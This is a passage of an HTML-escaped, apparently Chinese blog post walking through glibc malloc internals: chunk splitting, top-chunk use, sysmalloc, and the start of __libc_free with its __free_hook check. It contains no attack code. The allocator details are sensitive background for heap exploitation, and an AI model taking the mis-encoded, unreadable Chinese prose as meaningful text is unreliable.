class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* Exhaust */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (remainder_size &amp;lt; MINSIZE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          set_inuse_bit_at_offset (victim, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (av != &amp;amp;main_arena)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            set_non_main_arena (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* Split */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          remainder = chunk_at_offset (victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;comment&#34;&gt;/* We cannot assume the unsorted list is empty and therefore&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;             have to perform a complete insert here.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          bck = unsorted_chunks (av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          fwd = bck-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (fwd-&amp;gt;bk != bck))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): corrupted unsorted chunks 2&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          remainder-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          remainder-&amp;gt;fd = fwd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          bck-&amp;gt;fd = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          fwd-&amp;gt;bk = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;comment&#34;&gt;/* advertise as last remainder */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (in_smallbin_range (nb))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            av-&amp;gt;last_remainder = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_smallbin_range (remainder_size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              remainder-&amp;gt;fd_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              remainder-&amp;gt;bk_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          set_head (victim, nb | PREV_INUSE |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    (av != &amp;amp;main_arena ? NON_MAIN_ARENA : &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          set_head (remainder, remainder_size | PREV_INUSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          set_foot (remainder, remainder_size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      check_malloced_chunk (av, victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = chunk2mem (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      alloc_perturb (p, bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ14№╝ЅтдѓТъюСИіжЮбуџёТЊЇСйюУ┐ўСИЇУЃйТ╗АУХ│У»иТ▒ѓ№╝їт░▒тЈфУЃйС╗ј top chunk СИіУ┐ЏУАїтѕЄтѕєсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   use_top:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         If large enough, split off the chunk bordering the end of memory&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         (held in av-&amp;gt;top). Note that this is in accord with the best-fit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         search rule.  In effect, av-&amp;gt;top is treated as larger (and thus&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         less well fitting) than any other available chunk since it can&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         be extended to be as large as necessary (up to system&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         limitations).&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         We require that av-&amp;gt;top always exists (i.e., has size &amp;gt;=&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         MINSIZE) after initialization, so if it would otherwise be&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         exhausted by current request, it is replenished. (The main&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         reason for ensuring it exists is that we may need MINSIZE space&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         to put in fenceposts in sysmalloc.)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;       */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      victim = av-&amp;gt;top;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      size = chunksize (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (size &amp;gt; av-&amp;gt;system_mem))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): corrupted top size&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (size) &amp;gt;= (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (nb + MINSIZE))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          remainder_size = size - nb;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          remainder = chunk_at_offset (victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          av-&amp;gt;top = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          set_head (victim, nb | PREV_INUSE |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    (av != &amp;amp;main_arena ? NON_MAIN_ARENA : &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          set_head (remainder, remainder_size | PREV_INUSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          check_malloced_chunk (av, victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = chunk2mem (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          alloc_perturb (p, bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* When we are using atomic ops to free fast chunks we can get&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         here for all block sizes.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (atomic_load_relaxed (&amp;amp;av-&amp;gt;have_fastchunks))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          malloc_consolidate (av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;comment&#34;&gt;/* restore original bin index */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (in_smallbin_range (nb))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            idx = smallbin_index (nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            idx = largebin_index (nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         Otherwise, relay to handle system-dependent cases&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;       */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = sysmalloc (nb, av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                                                                                       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (p != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            alloc_perturb (p, bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тюеСИ╗у║┐уеІСИІ№╝їsysmalloc () тЄйТЋ░уџётцДТдѓТхЂуеІтдѓСИІ№╝џ&lt;/p&gt;
&lt;p&gt;РђІ	№╝ѕ1№╝ЅтйЊућ│У»иуџётцДт░Ј nb тцДС║ј mp_.mmap_threshold ТЌХ№╝їжђџУ┐Є mmap () тЄйТЋ░У┐ЏУАїтѕєжЁЇсђѓтЁХСИГ mp_.mmap_threshold уџёж╗ўУ«цтцДт░ЈСИ║ 128*1024 тГЌУіѓсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	№╝ѕ2№╝Ѕт░ЮУ»Ћуће brk () ТЅЕт▒ЋтаєтєЁтГў№╝їтйбТѕљТќ░уџё top chunk №╝їУђїС╣Ёуџё top chunk С╝џУбФжЄіТћЙсђѓуёХтљјС╗јТќ░уџё top chunk СИГтѕЄтѕєтЄ║ nb тцДт░Јуџё chunk №╝їУ┐ћтЏъу╗ЎућеТѕисђѓ&lt;/p&gt;
&lt;h2 id=&#34;5freeуЏИтЁ│Т║љуаЂ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5freeуЏИтЁ│Т║љуаЂ&#34;&gt;#&lt;/a&gt; 5.free () уЏИтЁ│Т║љуаЂ№╝џ&lt;/h2&gt;
&lt;h3 id=&#34;__libc_free&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__libc_free&#34;&gt;#&lt;/a&gt; __libc_free()№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	тљї malloc () тЄйТЋ░СИђТаи№╝їfree () тЄйТЋ░т«ъжЎЁСИіТў» __libc_free ()№╝їтЁХт«џС╣ЅтдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __libc_free (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *mem)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mstate ar_ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mchunkptr p;                          &lt;span class=&#34;comment&#34;&gt;/* chunk corresponding to mem */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*hook) (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    = atomic_forced_read (__free_hook);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (hook != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)) &lt;span class=&#34;comment&#34;&gt;//hookтЄйТЋ░СИЇТў»null№╝їт░▒ТЅДУАї__free_hookт»╣т║ћуџётЄйТЋ░т╣ХУ┐ћтЏъ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      (*hook)(mem, RETURN_ADDRESS (&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (mem == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)                              &lt;span class=&#34;comment&#34;&gt;/* free(0) has no effect */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  p = mem2chunk (mem); &lt;span class=&#34;comment&#34;&gt;//т░єТїЄтљЉuser data уџёТїЄжњѕУйгтїќСИ║ТїЄтљЉ chunkуџёТїЄжњѕ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (chunk_is_mmapped (p)) &lt;span class=&#34;comment&#34;&gt;//тдѓТъюchunkТў»mmapтѕєжЁЇуџё№╝їт░▒ућеmunmap_chunk№╝ѕ№╝ЅтЄйТЋ░жЄіТћЙ                /* release mmapped memory. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* See if the dynamic brk/mmap threshold needs adjusting.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	 Dumped fake mmapped chunks do not affect the threshold.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 